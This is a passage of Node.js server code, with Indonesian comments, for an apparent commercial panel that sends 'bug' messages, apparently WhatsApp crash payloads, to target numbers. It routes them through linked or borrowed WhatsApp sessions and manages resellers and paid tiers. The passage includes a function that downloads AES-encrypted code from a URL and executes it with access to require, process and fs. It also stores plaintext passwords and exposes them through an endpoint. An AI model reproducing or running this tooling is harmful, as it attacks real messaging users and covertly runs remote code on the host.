        
        return true;
        
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        
        let errorType = 'unknown';
        if (err.message.includes('Connection')) {
          errorType = 'sender_offline';
        } else if (err.message.includes('timeout')) {
          errorType = 'timeout';
        } else if (err.message.includes('rate')) {
          errorType = 'rate_limit';
        }
        
        if (!retry && (errorType === 'sender_offline' || errorType === 'timeout')) {
          console.log(`[🔄 RETRY] Mencoba retry untuk user ${user.username}`);
          
          let retrySock = null;
          
          if (selectedSenderMode === 'private') {
            retrySock = await checkActiveSessionInFolder(user.username);
          } else {
            const availableSocks = [];
            const baseDir = path.join(__dirname, 'permenmd');
            
            if (fs.existsSync(baseDir)) {
              const allUsers = fs.readdirSync(baseDir).filter(p => {
                return fs.lstatSync(path.join(baseDir, p)).isDirectory();
              });
              
              for (const u of allUsers) {
                const uPath = path.join(baseDir, u);
                const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
                for (const f of files) {
                  const sessionName = path.basename(f, ".json");
                  if (activeConnections[sessionName] && u !== user.username) {
                    availableSocks.push(activeConnections[sessionName]);
                  }
                }
              }
            }
            
            if (availableSocks.length > 0) {
              retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
            }
          }
          
          if (retrySock) {
            console.log(`[🔄 RETRY] Menggunakan sender baru untuk retry`);
            return await attemptSend(retrySock, true);
          }
        }
        
        updateBugProcess(processId, { 
          status: 'failed', 
          message: err.message || 'Gagal mengirim',
          error_type: errorType,
          progress: 0
        });
        
        logDelivery(key, originalTarget, {
          type: 'bug',
          bugType: bug,
          status: 'failed',
          message: err.message || 'Gagal mengirim',
          sender: senderInfo
        });
        
        addBugLog({
          username: user.username,
          user_role: user.role,
          target: originalTarget,
          bug_type: bug,
          status: 'failed',
          message: err.message || 'Gagal mengirim',
          sender: senderInfo,
          sender_mode: selectedSenderMode,
          error_type: errorType,
          process_id: processId
        });
        
        if (!user.stats) user.stats = { totalSent: 0, totalSuccess: 0, totalFailed: 0, executionsByBug: {} };
        user.stats.totalSent = (user.stats.totalSent || 0) + 1;
        user.stats.totalFailed = (user.stats.totalFailed || 0) + 1;
        saveDatabase(db);
        
        try {
          let errorMessage = err.message || 'Unknown error';
          if (errorMessage.length > 100) errorMessage = errorMessage.substring(0, 100) + '...';
          
          await bot.sendMessage(OWNER_ID, 
            `❌ *BUG GAGAL DIKIRIM*\n\n` +
            `*User:* ${user.username} (${role})\n` +
            `*Target:* ${originalTarget}\n` +
            `*Bug:* ${bug}\n` +
            `*Sender:* ${senderInfo}\n` +
            `*Sender Mode:* ${selectedSenderMode.toUpperCase()}\n` +
            `*Alasan Gagal:* \`${errorMessage}\`\n` +
            `*Error Type:* ${errorType}\n` +
            `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
            { parse_mode: 'Markdown' }
          );
        } catch (e) {}
        
        return false;
      }
    };

    try {
      await attemptSend(actualSender, false);
    } catch (err) {
      console.error(`[❌ FATAL] Error di background process:`, err);
      
      updateBugProcess(processId, { 
        status: 'failed', 
        message: 'Fatal error: ' + (err.message || 'Unknown'),
        error_type: 'fatal'
      });
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Fatal error',
        sender: senderInfo,
        sender_mode: selectedSenderMode,
        error_type: 'fatal',
        process_id: processId
      });
    }
  });
});

app.get('/bugMonitor/clear', async (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== 'owner') {
    return res.status(403).json({ 
      success: false,
      error: 'Access denied. Only owner can clear monitoring data.' 
    });
  }

  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  activeBugProcesses = activeBugProcesses.filter(p => 
    p.status === 'processing' || 
    new Date(p.timestamp).getTime() > oneHourAgo
  );

  const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
  bugHistory = bugHistory.filter(h => 
    new Date(h.timestamp).getTime() > oneDayAgo
  );

  res.json({
    success: true,
    message: 'Monitoring data cleaned',
    active_remaining: activeBugProcesses.length,
    history_remaining: bugHistory.length
  });
});

app.get('/bugMonitor/summary', async (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== 'owner') {
    return res.status(403).json({ 
      success: false,
      error: 'Access denied. Only owner can view summary.' 
    });
  }

  resetDailyStats();

  const userStats = {};
  bugHistory.forEach(log => {
    if (!userStats[log.username]) {
      userStats[log.username] = {
        username: log.username,
        role: log.user_role,
        total: 0,
        success: 0,
        failed: 0,
        pending: 0
      };
    }
    userStats[log.username].total++;
    if (log.status === 'success') userStats[log.username].success++;
    if (log.status === 'failed') userStats[log.username].failed++;
    if (log.status === 'pending') userStats[log.username].pending++;
  });

  const bugTypeStats = {};
  bugHistory.forEach(log => {
    if (!bugTypeStats[log.bug_type]) {
      bugTypeStats[log.bug_type] = {
        bug_type: log.bug_type,
        total: 0,
        success: 0,
        failed: 0
      };
    }
    bugTypeStats[log.bug_type].total++;
    if (log.status === 'success') bugTypeStats[log.bug_type].success++;
    if (log.status === 'failed') bugTypeStats[log.bug_type].failed++;
  });

  res.json({
    success: true,
    summary: {
      total_processes: activeBugProcesses.length,
      total_history: bugHistory.length,
      total_users: Object.keys(userStats).length,
      total_bug_types: Object.keys(bugTypeStats).length,
      stats_today: bugStats,
      user_stats: Object.values(userStats),
      bug_type_stats: Object.values(bugTypeStats)
    }
  });
});
              
const roleLevel = {
  member: 1,
  reseller: 2,
  vip: 3,
  admin: 4,
  owner: 5
};

const roleFallback = {
  member: [],
  reseller: ["member"],
  vip: ["member"],
  admin: ["vip", "member", "reseller"],
  owner: ["admin", "vip", "member", "reseller"],
};

function getAvailableSender(user, db) {
  const userRole = user.role || "member";
  
  const ownSock = checkActiveSessionInFolder(user.username);
  if (ownSock) {
    console.log(`[SENDER] ${user.username} pakai sender sendiri`);
    return ownSock;
  }

  if (userRole === 'member') {
    console.log(`[SENDER] Member ${user.username} tidak punya session`);
    return null;
  }

  const allowedRoles = roleFallback[userRole] || [];

  if (!allowedRoles || allowedRoles.length === 0) {
    console.log(`[SENDER] ${user.username} tidak punya fallback role`);
    return null;
  }

  for (const fallbackRole of allowedRoles) {
    for (const u of db) {
      if (u.username === user.username) continue;
      if (u.role !== fallbackRole) continue;
      
      const sock = checkActiveSessionInFolder(u.username);
      if (sock) {
        console.log(`[SENDER] ${user.username} (${userRole}) pakai sender ${u.username} (${u.role})`);
        return sock;
      }
    }
  }

  console.log(`[SENDER] Tidak ada sender fallback tersedia untuk ${user.username}`);
  return null;
}

function checkActiveSessionInFolder(subfolderName) {
  try {
    const folderPath = path.join('aan', subfolderName);
    if (!fs.existsSync(folderPath)) {
      console.log(`[FOLDER] Folder ${folderPath} tidak ditemukan`);
      return null;
    }

    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, ".json");
      
      if (activeConnections[sessionName]) {
        console.log(`[SESSION] Session ${sessionName} ditemukan di memory`);
        return activeConnections[sessionName];
      }
      
      if (activeConnections[subfolderName]) {
        console.log(`[SESSION] Session ${subfolderName} ditemukan di memory`);
        return activeConnections[subfolderName];
      }
    }
    
    if (activeConnections[subfolderName]) {
      console.log(`[SESSION] Session ${subfolderName} ditemukan di memory (direct)`);
      return activeConnections[subfolderName];
    }
    
    return null;
  } catch (error) {
    console.log(`[ERROR] checkActiveSessionInFolder: ${error.message}`);
    return null;
  }
}
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('aan', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];

    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);

    if (!user) {
      return res.status(401).json({ error: "User not found" });
    }

    const privilegedRoles = ["founder", "owner", "vip", "reseller"];
    let connections = [];

    if (privilegedRoles.includes(user.role)) {
      
      if (user.role === "founder" || user.role === "owner") {
        for (const sessionKey in activeConnections) {
          const conn = activeConnections[sessionKey];
          connections.push({
            session: sessionKey,
            status: "active",
            username: conn.username || "Unknown",
            role: conn.role || "Unknown",
            androidId: conn.androidId || "Unknown",
            connectedAt: conn.connectedAt || new Date().toISOString(),
          });
        }
      } 
      else {
        for (const sessionKey in activeConnections) {
          connections.push({
            session: sessionKey,
            status: "active"
          });
        }
      }

    } else {
      const userFolder = path.join("aan", user.username);

      if (fs.existsSync(userFolder)) {

        const files = fs.readdirSync(userFolder)
          .filter(f => f.endsWith(".json"));

        files.forEach(file => {
          const nomor = path.basename(file, ".json");

          if (activeConnections[nomor]) {
            connections.push({
              session: nomor,
              status: "active"
            });
          }
        });

      }
    }

    return res.json({
      valid: true,
      role: user.role,
      total: connections.length,
      connections
    });

  } catch (err) {
    console.log("[ERROR] /mySender:", err.message);
    return res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('aan', user.username, number); 

  if (!fs.existsSync(`aan/${user.username}`)) fs.mkdirSync(`aan/${user.username}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}', role: ${role || 'member'}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const requestedRole = role || 'member';
  if (!['member', 'vip'].includes(requestedRole)) {
    console.log("[❌ CREATE] Role tidak valid.");
    return res.json({ valid: true, created: false, message: "Invalid role. Must be 'member' or 'vip'." });
  }

  if (creator.role === "reseller" && !['member', 'vip'].includes(requestedRole)) {
    console.log("[❌ CREATE] Reseller tidak bisa membuat role tersebut.");
    return res.json({ 
      valid: true, 
      created: false, 
      message: "Reseller can only create member and VIP accounts." 
    });
  }

  const days = parseInt(day);
  if (requestedRole === 'vip' && days > 365) {
    console.log("[❌ CREATE] VIP maksimal 365 hari.");
    return res.json({ 
      valid: true, 
      created: false, 
      invalidDay: true, 
      message: "VIP accounts can only be created up to 365 days." 
    });
  } else if (requestedRole === 'member' && days > 30) {
    console.log("[❌ CREATE] Member maksimal 30 hari.");
    return res.json({ 
      valid: true, 
      created: false, 
      invalidDay: true, 
      message: "Member accounts can only be created up to 30 days." 
    });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + days);

  // ═══ PAIRID: hanya untuk role privileged ═══
  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: requestedRole,
    parent: creator.username
  };
  if (isRatPrivileged(requestedRole)) {
    newAccount.pairId = genPairId();
  }

  db.push(newAccount);
  saveDatabase(db);
    
  sendToGroups(
    `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
    { parse_mode: "Markdown" }
  );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} (${requestedRole}) duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ 
    valid: true, 
    created: true, 
    user: newAccount,
    message: `${requestedRole.toUpperCase()} account created successfully.`
  });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || (admin.role !== "owner" && admin.role !== "founder")) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner/founder.`);
    return res.json({ valid: true, authorized: false, message: "Only owner or founder can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  
  if (deletedUser.role === "owner" && admin.role !== "founder") {
    console.log("[❌ DELETE] Tidak bisa menghapus owner.");
    return res.json({ valid: true, deleted: false, message: "Cannot delete owner account. Only founder can delete owner." });
  }
  
  if (deletedUser.role === "founder") {
    console.log("[❌ DELETE] Tidak bisa menghapus founder.");
    return res.json({ valid: true, deleted: false, message: "Cannot delete founder account." });
  }

  db.splice(index, 1);
  saveDatabase(db);
    
  sendToGroups(
    `🗑️ *Akun Dihapus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
    { parse_mode: "Markdown" }
  );
    
  const logLine = `${admin.username} Deleted ${deletedUser.username} (Role: ${deletedUser.role})\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: true, authorized: false, message: "User not found." });
  }

  let users = [];
  if (user.role === "founder" || user.role === "owner") {
    users = db.map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: u.role || "member",
      parent: u.parent || "SYSTEM",
      pairId: u.pairId || ''
    }));
  } else if (user.role === "reseller") {
    users = db
      .filter(u => ['member', 'vip'].includes(u.role))
      .map(u => ({
        username: u.username,
        expiredDate: u.expiredDate,
        role: u.role || "member",
        parent: u.parent || "SYSTEM",
        pairId: u.pairId || ''
      }));
  } else {
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    return res.json({ valid: true, authorized: false, message: "Creator not found." });
  }

  let validRoles = [];
  let isAuthorized = false;
  
  if (creator.role === "founder") {
    validRoles = ['owner', 'reseller', 'vip', 'member'];
    isAuthorized = true;
  } else if (creator.role === "owner") {
    validRoles = ['reseller', 'vip', 'member'];
    isAuthorized = true;
  } else if (creator.role === "reseller") {
    validRoles = ['member', 'vip'];
    isAuthorized = true;
  } else {
    console.log("[❌ USERADD] Role tidak diizinkan membuat akun.");
    return res.json({ valid: true, authorized: false, message: "Your role cannot create accounts." });
  }

  if (!isAuthorized || !validRoles.includes(role)) {
    console.log(`[❌ USERADD] Role ${role} tidak valid untuk ${creator.role}.`);
    return res.json({ 
      valid: true, 
      created: false, 
      message: `Invalid role. ${creator.role === "founder" ? "Founder can create: owner, reseller, vip, member" : creator.role === "owner" ? "Owner can create: reseller, vip, member" : "Reseller can create: member, vip"}` 
    });
  }

  const days = parseInt(day);
  let maxDays = 365;
  
  if (role === 'member') {
    maxDays = 30;
  } else if (role === 'vip') {
    maxDays = 365;
  } else if (role === 'reseller') {
    maxDays = 365;
  } else if (role === 'owner') {
    maxDays = 365;
  }
  
  if (days > maxDays) {
    return res.json({ 
      valid: true, 
      created: false, 
      invalidDay: true, 
      message: `Maximum ${maxDays} days for ${role} role.` 
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + days);

  // ═══ PAIRID: hanya untuk role privileged ═══
  const newUser = {
    username,
    password,
    role: role,
    expiredDate: expired.toISOString().split("T")[0],
    parent: creator.username,
    createdAt: new Date().toISOString()
  };
  if (isRatPrivileged(role)) {
    newUser.pairId = genPairId();
  }

  db.push(newUser);
  saveDatabase(db);
    
  sendToGroups(
    `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username} (${creator.role.toUpperCase()})\nDurasi: ${day} hari\nRole: ${newUser.role.toUpperCase()}`,
    { parse_mode: "Markdown" }
  );

  const logLine = `${creator.username} (${creator.role}) Created ${username} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["founder", "owner", "reseller"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only founder, owner, or reseller can edit user." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller") {
    if (!['member', 'vip'].includes(targetUser.role)) {
      console.log("[❌ EDIT] Reseller hanya bisa edit member dan VIP.");
      return res.json({ valid: true, edited: false, message: "Reseller can only edit member and VIP accounts." });
    }
  } else if (editor.role === "owner") {
    if (targetUser.role === "founder") {
      console.log("[❌ EDIT] Owner tidak bisa edit founder.");
      return res.json({ valid: true, edited: false, message: "Owner cannot edit founder accounts." });
    }
  } else if (editor.role === "founder") {
    if (targetUser.role === "founder" && targetUser.username !== editor.username) {
      console.log("[❌ EDIT] Founder tidak bisa edit founder lain.");
      return res.json({ valid: true, edited: false, message: "Founder cannot edit other founder accounts." });
    }
  }

  const days = parseInt(addDays);
  let maxDays = 365;
  
  if (targetUser.role === 'member') {
    maxDays = 30;
  } else if (targetUser.role === 'vip') {
    maxDays = 365;
  } else if (targetUser.role === 'reseller') {
    maxDays = 365;
  } else if (targetUser.role === 'owner') {
    maxDays = 365;
  } else if (targetUser.role === 'founder') {
    maxDays = 365;
  }
  
  if (days > maxDays) {
    return res.json({ 
      valid: true, 
      edited: false, 
      invalidDay: true, 
      message: `Maximum ${maxDays} days extension for ${targetUser.role} role.` 
    });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + days);
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} (${editor.role}) Edited ${targetUser.username} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/changeRole", (req, res) => {
  const { key, username, newRole } = req.query;
  console.log(`[🔄 CHANGEROLE] Request ubah role ${username} menjadi ${newRole} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CHANGEROLE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const changer = db.find(u => u.username === keyInfo.username);

  if (!changer || changer.role !== "founder") {
    console.log(`[❌ CHANGEROLE] ${changer?.username || "Unknown"} bukan founder.`);
    return res.json({ valid: true, authorized: false, message: "Only founder can change user roles." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ CHANGEROLE] User tidak ditemukan.");
    return res.json({ valid: true, changed: false, message: "User not found." });
  }

  if (targetUser.role === "founder") {
    console.log("[❌ CHANGEROLE] Tidak bisa mengubah role founder lain.");
    return res.json({ valid: true, changed: false, message: "Cannot change other founder's role." });
  }

  const validRoles = ['owner', 'reseller', 'vip', 'member'];
  if (!validRoles.includes(newRole)) {
    console.log(`[❌ CHANGEROLE] Role ${newRole} tidak valid.`);
    return res.json({ valid: true, changed: false, message: "Invalid role. Must be: owner, reseller, vip, member" });
  }

  const oldRole = targetUser.role;
  targetUser.role = newRole;

  // ═══ PAIRID: kalau role baru privileged dan belum punya, generate ═══
  if (isRatPrivileged(newRole) && !targetUser.pairId) {
    targetUser.pairId = genPairId();
    console.log(`[PAIRID] Auto-generate (changeRole) untuk ${targetUser.username} (${newRole}): ${targetUser.pairId}`);
  }

  saveDatabase(db);
  
  sendToGroups(
    `🔄 *Role Diubah*\nUsername: ${targetUser.username}\nRole Lama: ${oldRole.toUpperCase()}\nRole Baru: ${newRole.toUpperCase()}\nDiubah Oleh: ${changer.username} (FOUNDER)`,
    { parse_mode: "Markdown" }
  );

  const logLine = `${changer.username} (FOUNDER) Changed Role ${username} from ${oldRole} to ${newRole}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ CHANGEROLE] Role berhasil diubah:", targetUser);
  return res.json({ valid: true, authorized: true, changed: true, user: targetUser, oldRole: oldRole, newRole: newRole });
});

app.get("/founderDashboard", (req, res) => {
  const { key } = req.query;
  console.log(`[📊 FOUNDER] Request dashboard oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ FOUNDER] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "founder") {
    console.log(`[❌ FOUNDER] ${user?.username || "Unknown"} bukan founder.`);
    return res.json({ valid: true, authorized: false, message: "Only founder can access this endpoint." });
  }

  const totalUsers = db.length;
  const activeUsers = db.filter(u => {
    const expired = new Date(u.expiredDate);
    const today = new Date();
    return expired >= today;
  }).length;
  
  const statsByRole = {
    founder: db.filter(u => u.role === 'founder').length,
    owner: db.filter(u => u.role === 'owner').length,
    reseller: db.filter(u => u.role === 'reseller').length,
    vip: db.filter(u => u.role === 'vip').length,
    member: db.filter(u => u.role === 'member').length,
  };

  const recentUsers = db.slice(-5).reverse().map(u => ({
    username: u.username,
    role: u.role,
    expiredDate: u.expiredDate,
    parent: u.parent,
    createdAt: u.createdAt || 'Unknown',
  }));

  console.log("[✅ FOUNDER] Dashboard data berhasil diambil.");
  return res.json({
    valid: true,
    authorized: true,
    totalUsers,
    activeUsers,
    statsByRole,
    recentUsers,
    serverStatus: "Online",
    apiVersion: "V6.0.0",
    lastBackup: new Date().toISOString().split("T")[0],
  });
});

app.get("/founderUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[👥 FOUNDER] Request detail users oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "founder") {
    return res.json({ valid: true, authorized: false, message: "Only founder can access this endpoint." });
  }

  const users = db.map(u => ({
    username: u.username,
    password: u.password,
    role: u.role,
    expiredDate: u.expiredDate,
    parent: u.parent || "SYSTEM",
    createdAt: u.createdAt || "Unknown",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.post("/updateUser", (req, res) => {
  const { key, username, role, expired } = req.body;
  console.log(`[✏️ UPDATE] Update user ${username} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const founder = db.find(u => u.username === keyInfo.username);

  if (!founder || founder.role !== "founder") {
    return res.json({ valid: true, authorized: false, message: "Only founder can update users." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: true, updated: false, message: "User not found." });
  }

  if (role && ['owner', 'reseller', 'vip', 'member'].includes(role)) {
    targetUser.role = role;
  }
  
  if (expired && expired.trim().isNotEmpty) {
    targetUser.expiredDate = expired;
  }

  saveDatabase(db);

  const logLine = `${founder.username} (FOUNDER) Updated ${username}: Role=${targetUser.role}, Expired=${targetUser.expiredDate}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, updated: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

app.get("/createFreeAccount", (req, res) => {
  console.log(`[👤 FREE CREATE] Request create free account`);
  
  const db = loadDatabase();
  
  const randomNum = Math.floor(1000 + Math.random() * 9000);
  const newUsername = `AzxFree${randomNum}`;
  
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let newPassword = '';
  for (let i = 0; i < 6; i++) {
    newPassword += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  
  let finalUsername = newUsername;
  let counter = 1;
  while (db.find(u => u.username === finalUsername)) {
    finalUsername = `AzxFree${randomNum}${counter}`;
    counter++;
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + 7);
  const expiredDate = expired.toISOString().split("T")[0];

  // ═══ FREE = member = TIDAK dapat pairId ═══
  const newAccount = {
    username: finalUsername,
    password: newPassword,
    expiredDate: expiredDate,
    role: "member",
    createdAt: new Date().toISOString(),
    createdBy: "public_free",
    isFreeAccount: true
  };

  db.push(newAccount);
  saveDatabase(db);
  
  sendToGroups(
